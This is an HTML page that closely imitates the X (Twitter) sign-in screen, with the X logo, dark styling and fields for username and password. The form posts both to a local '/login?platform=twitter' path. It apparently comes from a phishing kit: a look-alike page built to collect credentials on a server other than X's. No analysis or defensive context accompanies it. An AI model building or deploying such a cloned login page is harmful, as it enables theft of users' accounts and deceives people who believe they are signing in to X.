<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to X / X</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", sans-serif;
        }
        body {
            background-color: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            width: 100%;
            padding: 20px;
        }
        .logo {
            width: 40px;
            margin-bottom: 30px;
            fill: #ffffff;
        }
        h1 {
            font-size: 31px;
            font-weight: 700;
            margin-bottom: 30px;
        }
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .input-group {
            position: relative;
            display: flex;
            flex-direction: column;
        }
        .input-group label {
            position: absolute;
            left: 10px;
            top: 8px;
            font-size: 13px;
            color: #71767b;
            transition: all 0.2s;
            pointer-events: none;
        }
        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: -10px;
            left: 5px;
            font-size: 13px;
            color: #1d9bf0;
        }
        input[type="text"], input[type="password"] {
            background-color: transparent;
            border: 1px solid #333639;
            border-radius: 4px;
            padding: 20px 10px 8px;
            color: #ffffff;
            font-size: 17px;
            outline: none;
            transition: all 0.2s;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #1d9bf0;
        }
        .login-button {
            background-color: #ffffff;
            color: #000000;
            border: none;
            border-radius: 9999px;
            font-size: 15px;
            font-weight: 700;
            padding: 12px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-button:hover {
            background-color: #e6e6e6;
        }
        .forgot-password {
            color: #1d9bf0;
            text-decoration: none;
            font-size: 15px;
            margin-top: 10px;
            display: inline-block;
        }
        .signup {
            margin-top: 40px;
        }
        .signup p {
            font-size: 15px;
            color: #71767b;
        }
        .signup a {
            color: #1d9bf0;
            text-decoration: none;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #71767b;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #333639;
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg viewBox="0 0 24 24" class="logo" aria-hidden="true">
            <g><path fill="#ffffff" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
        </svg>
        <h1>Sign in to X</h1>
        <form class="login-form" method="POST" action="/login?platform=twitter">
            <div class="input-group">
                <input type="text" name="username" id="username" placeholder=" " required>
                <label for="username">Phone, email, or username</label>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder=" " required>
                <label for="password">Password</label>
            </div>
            <button type="submit" class="login-button">Sign in</button>
            <a href="#" class="forgot-password">Forgot password?</a>
        </form>
        <div class="signup">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>
